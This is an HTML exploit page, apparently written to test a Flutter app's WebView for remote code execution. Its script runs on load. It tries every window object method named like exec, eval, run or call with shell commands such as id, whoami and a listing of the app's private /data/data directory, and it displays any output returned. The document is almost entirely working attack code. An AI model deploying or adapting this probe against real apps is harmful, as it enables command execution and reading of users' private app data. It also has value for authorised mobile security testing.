<!DOCTYPE html>
<html>
<head>
    <title>Capture RCE Response</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        .cmd { color: #0ff; }
        .success { color: #0f0; font-weight: bold; }
        .output { color: #fff; background: #222; padding: 10px; margin: 5px; border-left: 3px solid #0f0; }
    </style>
</head>
<body>
    <h2 style="color:red;">🔍 RCE Response Capture</h2>
    
    <div id="log"></div>
    
    <script>
        var log = document.getElementById('log');
        
        function test(name, command) {
            log.innerHTML += '<div class="cmd">$ Testing: ' + name + '(' + command + ')</div>';
            
            // Look for ANY JavaScript interface
            for(var key in window) {
                try {
                    var obj = window[key];
                    if(obj && typeof obj === 'object') {
                        // Check all methods
                        var methods = Object.getOwnPropertyNames(obj);
                        methods.forEach(method => {
                            if(method.includes('exec') || method.includes('eval') || method.includes('run') || method.includes('call')) {
                                try {
                                    log.innerHTML += '<div class="cmd">Trying: ' + key + '.' + method + '("' + command + '")</div>';
                                    var result = obj[method](command);
                                    if(result !== undefined && result !== null) {
                                        log.innerHTML += '<div class="success">✅ RESPONSE: ' + key + '.' + method + '</div>';
                                        log.innerHTML += '<div class="output">' + result + '</div>';
                                    }
                                } catch(e) {
                                    // Try with different parameter formats
                                    try {
                                        var result2 = obj[method]({command: command});
                                        if(result2) {
                                            log.innerHTML += '<div class="success">✅ RESPONSE (JSON): ' + key + '.' + method + '</div>';
                                            log.innerHTML += '<div class="output">' + result2 + '</div>';
                                        }
                                    } catch(e2) {}
                                }
                            }
                        });
                    }
                } catch(e) {}
            }
        }
        
        // Test basic commands
        test('id', 'id');
        test('whoami', 'whoami');
        test('pwd', 'pwd');
        test('ls app', 'ls /data/data/com.example.flutter_application_1/');
        test('echo', 'echo "RCE_TEST_$(date)"');
        
        log.innerHTML += '<div class="cmd">$ Scan complete</div>';
    </script>
</body>
</html>
